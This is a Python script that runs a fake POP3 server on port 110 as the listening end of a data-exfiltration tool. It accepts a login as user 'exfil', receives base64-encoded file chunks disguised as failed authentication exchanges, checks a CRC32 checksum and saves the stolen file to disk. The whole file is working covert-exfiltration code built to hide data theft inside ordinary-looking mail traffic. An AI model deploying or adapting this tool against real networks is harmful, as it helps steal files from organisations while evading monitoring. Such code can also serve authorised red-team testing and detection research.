#!/usr/bin/env python3

import sys
import zlib
import socket
import base64
import _thread
import re

# Configurations
port = 110
conns = 5

# Globals
MAX_SIZE = 4000
CHUNK = 256
ERR = 1
OKAY = 0


def _open_socket(host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(conns)
    except (socket.error) as variable:
        sys.stderr.write("[-] Socket error trying to listen to %s:%s.\n" % (host, port))
        sys.stderr.write(str(variable))
        sys.exit(ERR)
    sys.stdout.write("[+] Established a listening on %s:%s.\n" % (host, port))
    return sock

#Function for handling connections. This will be used to create threads
def clientthread(conn):
    
    conn.send('+OK POP3 service\n'.encode('UTF-8'))
    data = conn.recv(MAX_SIZE)
    if data.find("USER exfil".encode('UTF-8')) == -1:
        conn.send("Bad user\n".encode('UTF-8'))
        conn.close()
        sys.stdout.write("[-] Connection from %s used wrong password. Disconnected.\n")
        return OKAY

    conn.send("+OK password required for user exfil\n".encode('UTF-8'))
    data = conn.recv(MAX_SIZE)
    try:
        conv = base64.b64decode(data)
    except:
        conn.close()
        sys.stderr.write("Could not decode to base64.\n")
        return ERR
    conv = conv.split(";".encode('UTF-8'))
    sys.stdout.write("[+] Getting file %s with total of %s packets.\n" % (conv[0].decode("utf-8"), conv[2].decode("utf-8")))
    conn.send("-ERR [AUTH] Authentication failed\n".encode('UTF-8'))
    
    file_name = conv[0].split("/".encode('UTF-8'))[-1].decode("utf-8")[:-1]
    file_name = file_name.split("\\")[-1]
    
    packet_counter = 0
    entire_file = ""

    conv[2] = conv[2].decode("utf-8")

    for i in range(int(conv[2])):         # Was While-True
        data = conn.recv(MAX_SIZE)
        conn.send("-ERR [AUTH] Authentication failed\n".encode('UTF-8'))
        packet_counter += 1
        try:
            counter, cont = data.decode("utf-8").split(";b'")
            entire_file += cont
        except:
            if data.find("0000".encode("utf-8")) != -1:
                if packet_counter-1 == int(conv[2]):
                    sys.stdout.write("[+] Got all packets i needed (%s/%s).\n" % (packet_counter-1, conv[2]))
                else:
                    sys.stderr.write("[!] Got different number of packets from what needed (%s/%s).\n" % (packet_counter-1, conv[2]))
                # End of file
                break
    file_cont = base64.b64decode(entire_file)
    crc_check = zlib.crc32(file_cont)
    if crc_check == int(conv[1]):
        sys.stdout.write("[+] File CRC32 checksum is matching.\n")
    else:
        sys.stderr.write("[-] CRC32 checksum does not match. Saving anyway.\n")

    f = open(file_name, 'wb')
    f.write(file_cont)
    f.close()
    sys.stdout.write("[+] Saved file '%s' with length of %s.\n" % (file_name, len(file_cont)))


def start_server(host):
    print(""" 
      _____      _________ _ _ _            
     |  __ \     |  ____(_) | (_)            
     | |__) |   _| |__   _| | |_ _ __   __ _ 
     |  ___/ | | |  __| | | | | | '_ \ / _` |
     | |   | |_| | |    | | | | | | | | (_| |
     |_|    \__, |_|    |_|_|_|_|_| |_|\__, |
             __/ |                      __/ |
            |___/                      |___/ """)
    sockObj = _open_socket(host)
    while True:
        try:
            conn, address = sockObj.accept()
            sys.stdout.write("[+] Received a connection from %s:%s.\n" % (address[0], address[1]))
            _thread.start_new_thread(clientthread ,(conn,))
        except KeyboardInterrupt as variable:
            sys.stdout.write("\nGot KeyboardInterrupt, exiting now.\n")
            sys.exit(ERR)

if __name__ == "__main__":
    start_server("127.0.0.1")
